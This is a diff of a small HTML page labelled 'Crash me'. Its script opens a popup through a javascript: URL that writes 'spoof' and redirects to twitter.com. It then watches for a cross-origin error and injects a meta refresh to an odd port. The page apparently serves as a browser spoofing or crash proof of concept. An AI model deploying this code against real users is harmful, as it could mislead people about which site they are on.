@@ -1,73 +1,34 @@
-<!doctype html>
-<html lang="en">
-<head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
-<title>Crash me (centered & bigger)</title>
-
-<style>
-html, body {
-  height: 100%;
-  margin: 0;
-}
-body {
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  background: #f3f4f6;
-  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial;
-}
-a.crash-link {
-  display: inline-block;
-  font-size: 56px;
-  font-weight: 700;
-  text-decoration: none;
-  padding: 18px 36px;
-  border-radius: 12px;
-  background: #ffdddd;
-  color: #a00;
-  box-shadow: 0 6px 18px rgba(0,0,0,0.08);
-  cursor: pointer;
-}
-</style>
-
-</head>
-<body>
-<a href="#" class="crash-link" onclick="f(); return false;">Pencet me</a>
-
 <script>
+let w = null;
+let watcher = null;
+
 function f() {
+    w = window.open(
+        "javascript:document.write('spoof');location='https://twitter.com'",
+        "new",
+        "width=500,height=500"
+    );
 
-  let w = window.open(
-    "javascript:document.write('spoof');location='https://twitter.com'",
-    "new",
-    "width=500,height=500"
-  );
-
-  let watcher = setInterval(function () {
-
-    try {
-      const x = w.location.href;
-    } catch (e) {
-
-      clearInterval(watcher);
-
-      // meta refresh fallback
-      var meta = document.createElement("meta");
-      meta.httpEquiv = "refresh";
-      meta.content = "0;url=https://google.com:8181";
-      document.head.appendChild(meta);
-
+    if (watcher) {
+        clearInterval(watcher);
     }
 
-    if (!w || w.closed) {
-      clearInterval(watcher);
-    }
-
-  }, 100);
-
+    watcher = setInterval(function () {
+        try {
+            const x = w.location.href;
+        } catch (e) {
+            clearInterval(watcher);
+            // Sisipkan meta refresh langsung di sini
+            var meta = document.createElement("meta");
+            meta.httpEquiv = "refresh";
+            meta.content = "0;url=https://google.com:8181";
+            document.head.appendChild(meta);
+        }
+        if (!w || w.closed) {
+            clearInterval(watcher);
+        }
+    }, 100);
 }
 </script>
 
-</body>
-</html>
+<a href="#" class="crash-link" onclick="f(); return false;">Crash me</a>
